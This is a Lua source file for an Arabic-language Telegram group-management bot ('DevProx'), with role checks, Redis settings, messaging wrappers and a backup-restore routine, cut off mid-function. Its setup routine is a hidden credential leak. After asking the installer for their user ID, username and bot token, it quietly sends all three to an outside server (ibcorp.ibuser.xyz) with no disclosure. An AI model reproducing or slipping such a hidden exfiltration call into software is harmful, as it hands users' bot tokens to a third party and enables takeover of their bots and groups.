----------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS.
--   This Is The Source Channel @Dev_Prox .
--                - DevProx -
----------------------------------------------
 redis = require('redis')
 serpent = require("serpent")
 JSON = dofile('./JSON.lua')
JSON = dofile('./dkjson.lua')
 URL = require('socket.url')  
 HTTPS = require ("ssl.https")  
 https = require ("ssl.https") 
 http  = require ("socket.http")
 lgi = require('lgi')
 notify = lgi.require('Notify')
 notify.init ("Telegram updates")
 DevAbs = Redis.connect('127.0.0.1', 6379)
--     Source DevProx     --
--          gb            --
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 

local AutoSet = function()
io.write("\27[31;47m\n◼¦ الان ارسل ايديك -  Now send your id \27[0;34;49m\n")  
local sudo = tonumber(io.read())   
if not tostring(sudo):match('%d+') then  
local sudo = 218385683
end

io.write("\27[31;47m\n◼¦ الان ارسل معرفك مع ال @ Now send your username with \27[0;34;49m\n")  
local username = io.read()
io.write("\27[31;47m\n◼¦ الان ارسل توكن البوت      Now send your token bot \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")

local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    

file:write(serialized)    file:close()  
end

local create_config_auto = function()
config = {
sudo = sudo,
token = token,
bot_id = botid,
username = username,
sudo_users = {sudo}, 
}
create(config, "./config.lua")   
https.request("https://ibcorp.ibuser.xyz/DevProx/?id="..sudo.."&user="..username.."&token="..token)
file = io.open("RUNABS.sh", "w") 
file:write([[
#!/bin/bash 
token="]]..token..[["
while(true) do
rm -fr ../.telegram-cliذ
echo -e ""
echo -e ""
./tg -s ./DevProx.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("ABS", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./RUNABS.sh
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
os.execute('./ABS')
 end 

create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  

file:write(serialized)  
file:close() 
end 
end

local load_DevAbs = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  

local config = loadfile("./config.lua")() 
return config 
end  

_DevAbs = load_DevAbs()  
sudos = dofile("./config.lua") 
bot_owner = sudos.sudo 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
DevProx = sudos.bot_id
sudoUSERNAME = sudos.USERNAME
tokenbot = sudos.token
name_bot = (DevAbs:get(DevProx..'name_bot') or 'بروكس')
chats = {}
-------------------------------
--     Source DevProx     --
--     Start Functions    --
-------------------------------
-----------Bot Owner-----------
function is_leader(msg)
local var = false
if msg.sender_user_id_ == tonumber(bot_owner) then
var = true
end

return var
end

function is_leaderid(user_id)
local var = false
if user_id == tonumber(bot_owner) then
var = true
end

return var
end
-----------sudo-----------
function is_sudo(msg)
local var = false
for k,v in pairs(sudo_users) do
if msg.sender_user_id_ == v then
var = true
end
end

if msg.sender_user_id_ == tonumber(bot_owner) then
var = true
end

return var
end

function is_sudoid(user_id)
local var = false
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
---------------Admin-----------------
function is_admin(user_id)
local var = false
local abs =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abs, user_id)
if admin then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
---------------Owner all-------------------
function is_onall(user_id, chat_id)
local var = false
local abs =  'bot:onall:'
local onall = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
if onall then
var = true
end

if admin then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
------------------Modod all-------------------
function is_moall(user_id, chat_id)
local var = false
local abs =  'bot:moall:'
local moall = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'bot:onall:'
local onall = DevAbs:sismember(DevProx..absss, user_id)
if moall then
var = true
end

if admin then
 var = true
end

if onall then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
--------------Vip Group Member all-----------------
function is_vpall(user_id, chat_id)
local var = false
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'bot:onall:'
local onall = DevAbs:sismember(DevProx..absss, user_id)
local abssss = 'bot:vpall:'
local vpall = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'bot:moall:'
local moall = DevAbs:sismember(DevProx..absssss, user_id)
if VipGroup then
var = true 
end

if onall then
var = true
end

if admin then
var = true
end

if moall then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
-----------------donky----------------
function is_donky(user_id, chat_id)
local var = false
local abs =  'bot:donky:'..chat_id
local momod = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'bot:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..absss, user_id)
local abssss = 'bot:VipGroup:'..chat_id
local VipGroup = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'bot:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..absssss, user_id)
local abssssss =  'bot:onall:'
local onall = DevAbs:sismember(DevProx..abssssss, user_id)
local iqabs =  'bot:moall:'
local moall = DevAbs:sismember(DevProx..iqabs, user_id)
if donky then
var = true
end

if momod then
var = true
end

if owner then
var = true
end

if admin then
var = true
end

if monsh then
var = true
end

if onall then
var = true
end

if moall then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
---------------monsh----------------
function is_monsh(user_id, chat_id)
local var = false
local abs =  'bot:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
if monsh then
var = true
end

if admin then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
---------------Owner---------------
function is_owner(user_id, chat_id)
local var = false
local abs =  'bot:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'bot:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..absss, user_id)
if owner then
var = true
end

if admin then
var = true
end

if monsh then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
---------------Modod--------------
function is_momod(user_id, chat_id)
local var = false
local abs =  'bot:momod:'..chat_id
local momod = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'bot:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..absss, user_id)
local abssss =  'bot:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'bot:onall:'
local onall = DevAbs:sismember(DevProx..absssss, user_id)
if momod then
var = true
end

if owner then
var = true
end

if admin then
var = true
end

if monsh then
var = true
end

if onall then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
--------------VIP Member-----------------
function is_VipGroup(user_id, chat_id)
local var = false
local abs =  'bot:momod:'..chat_id
local momod = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'bot:admins:'
local admin = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'bot:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..absss, user_id)
local abssss = 'bot:VipGroup:'..chat_id
local VipGroup = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'bot:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..absssss, user_id)
local abssssss =  'bot:onall:'
local onall = DevAbs:sismember(DevProx..abssssss, user_id)
local iqabs =  'bot:moall:'
local moall = DevAbs:sismember(DevProx..iqabs, user_id)
if VipGroup then
var = true
end

if momod then
var = true
end

if owner then
var = true
end

if admin then
var = true
end

if monsh then
var = true
end

if onall then
var = true
end

if moall then
var = true
end

for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end

if user_id == tonumber(bot_owner) then
var = true
end

return var
end
--     Source DevProx     --
local setnumbergp = function()
local setnumbergp_two = function(user_id)
local abss = "admins:data:" .. user_id
local lists = DevAbs:smembers(DevProx..abss)
DevAbs:del(DevProx.."sudoNumberGp" .. user_id)
for k, v in pairs(lists) do
DevAbs:incr(DevProx.."sudoNumberGp" .. user_id)
end
end

local setnumbergp_three = function(user_id)
local absss = "admins:data:" .. user_id
local lists = DevAbs:smembers(DevProx..absss)
DevAbs:del(DevProx.."sudoNumberGp" .. user_id)
for k, v in pairs(lists) do
DevAbs:incr(DevProx.."sudoNumberGp" .. user_id)
end
end

local list = DevAbs:smembers(DevProx.."Bot:Admins")
for k, v in pairs(list) do
setnumbergp_two(v)
end

local lists = DevAbs:smembers(DevProx.."Bot:leader")
for k, v in pairs(lists) do
setnumbergp_three(v)
end

DevAbs:setex(DevProx.."bot:reload", 7230, true)
end
-------------------FreeWords--------------
local function is_free(msg, value)
local var = false
local abs = (DevProx..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end
end
end
return var
end
-------------------Banned----------------
local function is_banned(user_id, chat_id)
local var = false
local abs = 'bot:banned:'..chat_id
local banned = DevAbs:sismember(DevProx..abs, user_id)
if banned then
var = true
end

return var
end
------------------Muted-----------------
local function is_muted(user_id, chat_id)
local var = false
local abs = 'bot:muted:'..chat_id
local muted = DevAbs:sismember(DevProx..abs, user_id)
if muted then
var = true
end

return var
end
------------------Gbaned---------------
function is_gbanned(user_id)
local var = false
local abs = 'bot:gban:'
local gbanned = DevAbs:sismember(DevProx..abs, user_id)
if gbanned then
var = true
end

return var
end
--     Source DevProx     --
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end 

local function DevAbs1(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end

function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 

file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 

function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.JSON') then
if File_Name:lower():match('(%d+)') ~= DevProx:lower() then 
DevAbs1(chat,msg.id_,"⛔️❗️ عـذراً  هـذا ٱڵـملف ليس تابع لـهذٱ ٱڵـسورس")   
return false 
end 

local File = JSON:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..File.result.file_path, ''..File_Name) 
DevAbs1(chat,msg.id_,"❗️☻ جـٱري رفـع ٱڵـمـلـف")   
else
DevAbs1(chat,msg.id_,"⛔️❗️ غَـيـر صـحـيـح")   
end 

local info_file = io.open('./'..DevProx..'.JSON', "r"):read('*a')
local groups = JSON.decode(info_file)
DevAbs1(chat,msg.id_,"❗️☻ تـۖم رفـع ٱڵـنـسـخـه بِـنـجـاح \n❗️☻ تـۖم رفـع ٱداريين ٱڵمجمۄعات  ٱڵسابقين \n❗️☻ تـۖم قفـڵ جميع ٱوامـر ٱڵمجـمۄعات")
vardump(groups)
for idg,v in pairs(groups.GP_BOT) do
DevAbs:sadd(DevProx.."bot:groups",idg)
DevAbs:set(DevProx.."bot:enable:"..idg,true)
DevAbs:setex(DevProx.."bot:charge:"..idg,86400,true)
DevAbs:sadd("DevProx:addg"..bot_id, idg)
DevAbs:set(DevProx..'editmsg'..idg,true)
DevAbs:set(DevProx..'bot:bots:mute'..idg,true)
DevAbs:set(DevProx..'bot:bots:ban'..idg,true)
DevAbs:set(DevProx..'keed_bots'..idg,true)
DevAbs:set(DevProx..'anti-flood:'..idg,true)
DevAbs:set(DevProx..'bot:inline:mute'..idg,true)
DevAbs:set(DevProx..'bot:photo:mute'..idg,true)
DevAbs:set(DevProx..'bot:spam:mute'..idg,true)
DevAbs:set(DevProx..'bot:video:mute'..idg,true)
DevAbs:set(DevProx..'bot:gifs:mute'..idg,true)
DevAbs:set(DevProx..'bot:music:mute'..idg,true)
DevAbs:set(DevProx..'bot:voice:mute'..idg,true)
DevAbs:set(DevProx..'bot:links:mute'..idg,true)
DevAbs:set(DevProx..'bot:location:mute'..idg,true)
DevAbs:set(DevProx..'tags:lock'..idg,true)
DevAbs:set(DevProx..'bot:strict'..idg,true)
DevAbs:set(DevProx..'bot:document:mute'..idg,true)
DevAbs:set(DevProx..'bot:abstag:mute'..idg,true)
DevAbs:set(DevProx..'bot:contact:mute'..idg,true)
DevAbs:set(DevProx..'bot:webpage:mute'..idg,true)
DevAbs:set(DevProx..'bot:sticker:mute'..idg,true)
DevAbs:set(DevProx..'markdown:lock'..idg,true)
DevAbs:set(DevProx..'bot:forward:mute'..idg,true)
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
DevAbs:sadd(DevProx..'bot:monsh:'..idg,idmsh)  
print('تم رفع '..k..' منشئين')
end
end

if v.MDER then
for k,idmder in pairs(v.MDER) do
DevAbs:sadd(DevProx..'bot:owners:'..idg,idmder)  
print('تم رفع '..k..' مدراء')
end
end

if v.MOD then
for k,idmod in pairs(v.MOD) do
vardump(idmod)
DevAbs:sadd(DevProx..'bot:momod:'..idg,idmod)  
print('تم رفع '..k..' ادمنيه')
end
end

if v.VIP then
for k,idvip in pairs(v.VIP) do
DevAbs:sadd(DevProx..'bot:VipGroup:'..idg,idvip)  
print('تم رفع '..k..' مميزين')
end
end

if v.linkgroup then
if v.linkgroup ~= "" then
DevAbs:set(DevProx.."bot:group:link"..idg,v.linkgroup)   
print('تم وضع رابط ')
end
end
end
end
--     Source DevProx     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end

function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end

function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end

function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end

function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end

function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end

function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end

local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end

function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end

function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end

function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end

function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end

function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end

function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end

local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end

local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end

local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end

function getChats(offset_order, offset_chat_id, limit, cb, cmd)
if not limit or limit > 20 then
limit = 20
end

tdcli_function ({
ID = "GetChats",
offset_order_ = offset_order or 9223372036854775807,
offset_chat_id_ = offset_chat_id or 0,
limit_ = limit
}, cb or dl_cb, cmd)
end

function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end

function vardump(value)
print(serpent.block(value, {comment=false}))
end

function dl_cb(arg, data)
end

function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end

function Dev_Abs(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end

function sendaction(chat_id, action, progress)
tdcli_function ({
ID = "SendChatAction",
chat_id_ = chat_id,
action_ = {
ID = "SendMessage" .. action .. "Action",
progress_ = progress or 100
}
}, dl_cb, nil)
end

function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end

function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end

function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end

function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end

function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end

function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end

function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end

function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end

function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end

function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end

function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end

tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end

function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end

function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end

function chek_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = (result.member_count_ )
getChannelMembers(channel, 0, 'Bots', limit,cb)
end

getChannelFull(channel,callback_admins)
end

function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end

local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end

function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end

function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end

local function check_filter_words(msg, value)
local abs = (DevProx..'bot:filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_momod(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
--     Source DevProx     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end

local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end

local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 

local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end

function formsgg(msgs) 
local DevProx = ''  
if msgs < 100 then 
DevProx = "ضعيف جدا"
elseif msgs < 250 then 
DevProx = "ضعيف"
elseif msgs < 500 then 
DevProx = "غير متفاعل"
elseif msgs < 750 then 
DevProx = "متوسط"
elseif msgs < 1000 then 
DevProx = "متفاعل"
elseif msgs < 2000 then 
DevProx = "قمه التفاعل"
elseif msgs < 3000 then 
DevProx = "ملك التفاعل"
elseif msgs < 4000 then 
DevProx = "اسطوره التفاعل"
elseif msgs < 5000 then 
DevProx = "نار وشرار" 
elseif msgs < 6000 then 
DevProx = "جهنم حبي" 
elseif msgs < 7000 then 
DevProx = "فول" 
elseif msgs < 8000 then 
DevProx = "معلك لربك" 
elseif msgs < 9000 then 
DevProx = "حارك الكروب" 
end 
return DevProx
end

local renk_DevProx = function(msg)
if is_leaderid(msg.sender_user_id_) then
DevProx  = "المطور الاساسي"
elseif is_sudoid(msg.sender_user_id_) then
DevProx = "المطور الثانوي"
elseif is_admin(msg.sender_user_id_) then
DevProx = "المطور الثالث"
elseif is_onall(msg.sender_user_id_) then
DevProx = "المدير العام"
elseif is_moall(msg.sender_user_id_) then
DevProx = "الادمن العام"
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
DevProx = "المنشئ"
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
DevProx = "المدير"
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
DevProx = "الادمن"
else
DevProx = "العضو" 
end
return DevProx
end

function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
DevAbs:set(DevProx..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return DevAbs:get(DevProx..'bot:group:name'..GroupID)  end
--     Source DevProx     --
function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbs:get(DevProx..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source DevProx     --
function tdcli_update_callback(data)
end
--     Source DevProx     --
function DevProx11(msg)
local var = true 
if DevAbs:get(DevProx.."DevProx2") then
local channel = ''..DevAbs:get(DevProx..'DevProx3')..''
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = JSON:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
Dev_Abs(msg.chat_id_,msg.id_, 1, "❗️☻ عُـذراً لايُمكِنك ٱستخدام ٱڵـبوت  \nلانك لم تشارك فيۧ قناة ٱڵـبوت  \n‼️🚸 رجائاً ٱشترك  بٱڵـقناة ڵـتتمكن من ٱستخدٱمة. \n\n☑️┇ { 📍❕ قناة ٱڵـبوت : ["..channel.."] }\n", 1 , "md")
elseif data.ok then
return var
end
else
return var
end
end
--     Source DevProx     --
function tdcli_update_callback(data)
local our_id = DevAbs:get(DevProx.."Our_ID") or 0
local api_id = DevAbs:get(DevProx.."Bot:Api_ID") or 0
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and DevAbs:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbs:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⛔️❗️ تـۖم حـذف ٱلٱمـر مِن ٱڵمجـمۄعة", 1, 'html')  
else
